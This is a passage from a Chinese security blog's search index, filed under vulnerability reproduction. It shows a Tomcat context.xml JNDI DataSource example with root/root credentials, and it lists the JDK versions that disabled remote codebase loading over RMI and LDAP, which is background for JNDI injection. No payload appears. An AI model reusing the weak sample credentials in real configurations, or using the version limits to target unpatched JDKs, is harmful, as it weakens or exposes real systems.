title="3、还可以在项目的WebRoot下面的META-INF文件夹下面创建context.xml文件，再在context.xml文件里面写上"></a>3、还可以在项目的WebRoot下面的META-INF文件夹下面创建context.xml文件，再在context.xml文件里面写上</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;Context&gt; </span><br><span class="line">  &lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line"> auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><h5 id="三、针对不同的JDK版本，官方给出了一些限制："><a href="#三、针对不同的JDK版本，官方给出了一些限制：" class="headerlink" title="三、针对不同的JDK版本，官方给出了一些限制："></a>三、针对不同的JDK版本，官方给出了一些限制：</h5><p>1、JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true，表示禁用自动加载远程类文件。</p><p>2、JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p><p>3、JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
